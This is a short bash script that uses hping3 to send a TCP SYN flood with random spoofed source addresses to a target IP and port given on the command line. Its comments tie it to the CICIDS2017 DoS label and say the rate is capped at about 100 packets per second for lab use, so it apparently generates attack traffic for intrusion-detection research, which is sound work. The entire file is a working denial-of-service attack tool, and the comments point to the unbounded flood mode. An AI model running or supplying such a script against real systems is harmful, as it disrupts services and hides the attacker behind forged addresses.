#!/bin/bash
# TCP SYN flood — simulates DoS attack.
# Maps to CICIDS2017 "DoS" labels.

set -e

TARGET="${1:-}"
PORT="${2:-80}"
DURATION="${3:-30}"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target-ip> [port] [duration-seconds]"
    echo "  Default port: 80, default duration: 30s"
    exit 1
fi

echo "[*] SYN flood: $TARGET:$PORT for ${DURATION}s"
echo "[!] Send rate: 100 pps (intentionally moderate for lab use)"

# --flood would be unbounded; we cap with -i u10000 (10ms between packets = ~100 pps)
sudo timeout "$DURATION" hping3 -S -p "$PORT" -i u10000 --rand-source "$TARGET" || true

echo "[+] Flood complete"
